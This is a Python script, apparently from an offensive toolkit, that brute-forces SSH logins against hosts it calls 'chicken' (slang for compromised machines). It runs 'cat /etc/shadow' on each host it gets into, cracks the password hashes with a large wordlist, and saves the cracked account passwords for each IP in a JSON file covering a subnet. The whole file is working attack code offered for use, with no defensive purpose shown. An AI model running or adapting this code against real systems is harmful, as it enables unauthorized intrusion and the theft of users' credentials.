#!/usr/bin/env python3
# coding=utf-8
__author__ = "riverchu"

import os
import json
from brute import bruteSSH, loginSSH, bruteUnixPasswd

DATA_PATH = '/root/h/data/'
SSH_DICTIONARY = DATA_PATH+'dictionary/common/online_brute.txt'
PASS_DICTIONARY = DATA_PATH+'dictionary/common/top100thousand.txt'
CHICKEN_PATH = DATA_PATH+'hData/chicken/'
CHICKEN_FILE = 'chicken_subnet_10.210.txt'


# 破解
def brute(host, user, dictionary, *, connections):
    target = (host, user)
    dic = dict()
    dic['passwdFile'] = dictionary
    dic['maxConnection'] = connections

    brute_ret = bruteSSH.bruteSSH(*target, **dic)
    return brute_ret


# handle:pxssh handle host:ip
def standard_operate_chicken(handle, host):
    if not handle:
        return

    cmd_getpass = 'cat /etc/shadow'
    ret = loginSSH.send_command(handle, cmd_getpass)
    loginSSH.close_connection(handle)

    # 记录密码文件
    pass_bruteinfo = dict()
    pass_bruteinfo['ip'] = host
    pass_bruteinfo['account'] = {}
    if ret:
        # 破解密码文件内密码
        for line in ret.split('\n'):
            if len(line) < 4:
                continue
            passwd_info = bruteUnixPasswd.crack_unix_passwd(line, dic=PASS_DICTIONARY)
            if passwd_info['user'] != 'BannedUser':
                pass_bruteinfo['account'][passwd_info['user']] = {}
                pass_bruteinfo['account'][passwd_info['user']]['password'] = passwd_info['password']
                pass_bruteinfo['account'][passwd_info['user']]['hash'] = line

        if os.path.exists(CHICKEN_PATH+CHICKEN_FILE):
            chicken_info = json.load(open(CHICKEN_PATH+CHICKEN_FILE, 'r'))
        else:
            chicken_info = {}
        chicken_info[host] = pass_bruteinfo
        json.dump(chicken_info, open(CHICKEN_PATH+CHICKEN_FILE, 'w'), indent=4)


# brute_info:{'host': '1.2.3.4', 'user': 'root', 'type': 'password', 'key': None}
def operate_chicken(brute_info):
    handle = loginSSH.ret_login_handle(brute_info)
    if handle:
        standard_operate_chicken(handle, brute_info['ip'])


# 写入文件
def write_file(filename, passwd_info):
    with open(filename, 'a') as f:
        f.write(str(passwd_info)+'\n')


# 读取破解结果
def read_files(filename, path=CHICKEN_PATH):
    if os.path.exists(path):
        chicken_info = json.load(open(CHICKEN_PATH+filename, 'r'))
        return chicken_info


if __name__ == '__main__':
    mess = json.load(open(CHICKEN_PATH + CHICKEN_FILE, 'r'))
    # mess = read_files(CHICKEN_FILE)
    print(json.dumps(mess, indent=4))

